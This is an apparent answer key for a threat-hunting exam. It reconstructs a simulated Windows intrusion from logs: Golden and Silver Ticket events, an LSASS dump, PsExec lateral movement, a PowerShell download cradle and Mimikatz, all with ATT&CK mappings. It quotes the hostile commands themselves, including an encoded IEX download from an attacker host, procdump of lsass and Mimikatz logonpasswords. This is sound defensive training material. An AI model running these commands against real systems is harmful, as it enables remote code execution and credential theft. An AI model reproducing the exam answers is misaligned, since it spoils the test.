# CTHIRI Exam - Complete Answers & Analysis

**Investigation ID**: CTHIRI-2025-001  
**Date**: November 9, 2025  
**Investigator**: Umair Aziz  
**Status**: ✅ VERIFIED

---

## Question 1: Golden Ticket Attack Detection

### Requirements
Identify the suspicious Kerberos event indicating a possible Golden Ticket Attack.

### Answer

| Field | Value |
|-------|-------|
| **Attack log timestamp** | `2025-08-18T01:15:00Z` |
| **Host name** | `DC01` |
| **Source of the attack** | `Sysmon` |
| **Event ID** | `4769` |
| **Client IP** | `10.10.5.23` |
| **AttackOption** | `0x40810010` |
| **SPN** | `cifs/DC01` |

### Evidence
- **Log ID**: 76
- **Event Type**: Kerberos Service Ticket Request (4769)
- **Attack Category**: Golden Ticket
- **MITRE ATT&CK**: T1558.001
- **Indicators**:
  - Forged PAC signature
  - RC4-HMAC encryption (suspicious, should be AES)
  - TicketOptions: 0x40810010
  - Service: cifs/DC01

### Analysis
This event represents a Golden Ticket attack where the attacker forged a Kerberos Ticket Granting Ticket (TGT) with an invalid PAC signature. The use of RC4-HMAC encryption instead of modern AES is a strong indicator of ticket forgery. The attacker targeted the CIFS service on the domain controller (DC01).

---

## Question 2: Silver Ticket Detection

### Requirements
Find the event that suggests a Silver Ticket with account, host, timestamp, source, and event details.

### Answer

| Field | Value |
|-------|-------|
| **Account** | `WS02` / `HOST/WS02` |
| **Host** | `WS02` |
| **Timestamp** | `2025-08-18T03:40:00Z` |
| **Source** | `Sysmon` |
| **Event** | `4769` |

### Evidence
- **Log ID**: 221
- **Attack Category**: Silver Ticket
- **MITRE ATT&CK**: T1558.002
- **Indicators**:
  - Invalid PAC signature
  - Service ticket for HOST/WS02
  - Client Address: 10.10.5.23

### Analysis
The Silver Ticket attack occurred 2 hours and 25 minutes after the Golden Ticket. The attacker forged a service ticket directly for the HOST service on WS02, bypassing the need for a valid TGT. This technique provides persistent access to specific services.

---

## Question 3: LSASS Memory Dump

### Requirements
Locate the Sysmon Process Access event indicating an LSASS dump.

### Answer

| Field | Value |
|-------|-------|
| **Host** | `WS01` |
| **User** | `jdoe` |
| **Process** | `C:\Tools\procdump64.exe` |
| **Target** | `C:\Windows\System32\lsass.exe` |
| **Event** | `10` |
| **AccessMask Value** | `0x1FFFFF` |

### Evidence
- **Log ID**: 311
- **Timestamp**: 2025-08-18T05:10:00Z
- **Event Type**: Sysmon ProcessAccess (Event 10)
- **Attack Category**: Credential Access (LSASS Dump)
- **MITRE ATT&CK**: T1003.001
- **Command Line**: `procdump64.exe -ma lsass.exe C:\Temp\lsass.dmp`

### Analysis
The attacker used ProcDump (a legitimate Sysinternals tool) to dump LSASS memory to extract credentials. The AccessMask value 0x1FFFFF indicates full access rights (PROCESS_ALL_ACCESS). The dump was saved to `C:\Temp\lsass.dmp` for offline analysis.

---

## Question 4: PowerShell EncodedCommand

### Requirements
Find the PowerShell ScriptBlock (4104) with an EncodedCommand, identify URL and script name.

### Answer

| Field | Value |
|-------|-------|
| **Host/User** | `WS02/msmith` |
| **URL in base64** | `http://10.10.5.23/a.ps1` |
| **Script name** | `a.ps1` |
| **Event** | `4104` |

### Evidence
- **Log ID**: 421
- **Timestamp**: 2025-08-18T07:00:00Z
- **Attack Category**: Command and Scripting Interpreter (PowerShell)
- **MITRE ATT&CK**: T1059.001

**Encoded Command (Base64)**:
```
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4ANQAuADIAMwAvAGEALgBwAHMAMQAnACkA
```

**Decoded Command**:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.5.23/a.ps1')
```

### Analysis
This is a classic PowerShell download cradle using base64 encoding for obfuscation. The `IEX` (Invoke-Expression) cmdlet immediately executes the downloaded script. The malicious payload `a.ps1` was hosted on the attacker's server (10.10.5.23).

---

## Question 5A: Mimikatz Execution

### Requirements
Identify the mimikatz.exe execution with user, host, command arguments, and folder path.

### Answer

| Field | Value |
|-------|-------|
| **User** | `Administrator` |
| **Host** | `WS01` |
| **Command Argument** | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit` |
| **Folder Path** | `C:\Windows\Temp\` |

### Evidence
- **Log ID**: 461
- **Timestamp**: 2025-08-18T07:40:00Z
- **Event Type**: Sysmon Process Creation (Event 1)
- **Attack Category**: Credential Access (Mimikatz)
- **MITRE ATT&CK**: T1003
- **Full Path**: `C:\Windows\Temp\mimikatz.exe`

### Analysis
Mimikatz was executed with debug privileges to extract plaintext passwords from memory using the `sekurlsa::logonpasswords` command. This is the final stage of credential harvesting after the LSASS dump. The tool was placed in the Temp directory to evade basic file system monitoring.

---

## Question 5B: PsExec Lateral Movement

### Requirements
Identify PsExec-style lateral movement with source host, remote host, account, command, and filter query.

### Answer

| Field | Value |
|-------|-------|
| **Source Host** | `WS02` |
| **Remote Host** | `FILE01` |
| **Remote Account** | `CORP\svc_backup` |
| **Command** | `psexec.exe \\WS02 -u CORP\svc_backup -p ******** cmd /c whoami` |
| **Log Source** | `WindowsSecurity` |
| **Event ID** | `4688` |
| **Filter Query** | `event:4688 source:WindowsSecurity` |

### Evidence
- **Log ID**: 396
- **Timestamp**: 2025-08-18T06:35:00Z
- **Attack Category**: Lateral Movement (PsExec-like)
- **MITRE ATT&CK**: T1570
- **Process**: `C:\Windows\System32\psexecsvc.exe`

### Analysis
The attacker used PsExec to move laterally from WS02 to FILE01 using compromised service account credentials (CORP\svc_backup). The `whoami` command was executed remotely to verify access. This technique creates a service on the remote system to execute commands.

---

## Question 5C: Timeline & Chronology

### Chronological Attack Sequence

| Time (UTC) | Event | Host | Description |
|------------|-------|------|-------------|
| 01:15 | Golden Ticket | DC01 | Forged Kerberos TGT |
| 03:40 | Silver Ticket | WS02 | Forged service ticket |
| 05:10 | LSASS Dump | WS01 | Memory dump via procdump |
| 06:35 | PsExec | FILE01 | Lateral movement |
| 07:00 | PowerShell | WS02 | Download cradle execution |
| 07:40 | Mimikatz | WS01 | Password extraction |

### Specific Answers

**Which occurred first: LSASS dump or PsExec-like?**
- **Answer**: LSASS Dump
- LSASS Dump: 05:10:00Z
- PsExec: 06:35:00Z
- Time difference: 1 hour 25 minutes

**Time gap between Golden Ticket and PowerShell EncodedCommand?**
- Golden Ticket: 01:15:00Z
- PowerShell: 07:00:00Z
- **Answer**: **5h 45m** ✓

**Client IP in suspicious 4769 events?**
- **Answer**: `10.10.5.23`

**Accounts implicated by suspicious 4769 events?**
- **Golden Ticket** (Event 76): Service `cifs/DC01` on host `DC01`
- **Silver Ticket** (Event 221): Service `HOST/WS02` on host `WS02`

---

## Attack Kill Chain Summary

```
┌─────────────────────┐
│  Golden Ticket      │  T1558.001 - Persistence via forged TGT
│  01:15 - DC01       │
└──────────┬──────────┘
           │
┌──────────▼──────────┐
│  Silver Ticket      │  T1558.002 - Service-level persistence
│  03:40 - WS02       │
└──────────┬──────────┘
           │
┌──────────▼──────────┐
│  LSASS Dump         │  T1003.001 - Credential harvesting
│  05:10 - WS01       │
└──────────┬──────────┘
           │
┌──────────▼──────────┐
│  Lateral Movement   │  T1570 - Spread to FILE01
│  06:35 - FILE01     │
└──────────┬──────────┘
           │
┌──────────▼──────────┐
│  PowerShell         │  T1059.001 - Payload delivery
│  07:00 - WS02       │
└──────────┬──────────┘
           │
┌──────────▼──────────┐
│  Mimikatz           │  T1003 - Final credential theft
│  07:40 - WS01       │
└─────────────────────┘
```

### Attacker Information
- **IP Address**: 10.10.5.23 (consistent across all attacks)
- **Attack Duration**: ~6 hours 25 minutes
- **Systems Compromised**: DC01, WS01, WS02, FILE01
- **Accounts Compromised**: Administrator, jdoe, msmith, CORP\svc_backup

---

## Verification Status

✅ All answers verified against log data (Event IDs: 76, 221, 311, 396, 421, 461)  
✅ Timeline calculations confirmed  
✅ MITRE ATT&CK mappings validated  
✅ Evidence trails documented  

**Investigation Status**: COMPLETE

---

*Report generated from comprehensive analysis of 500 security events*
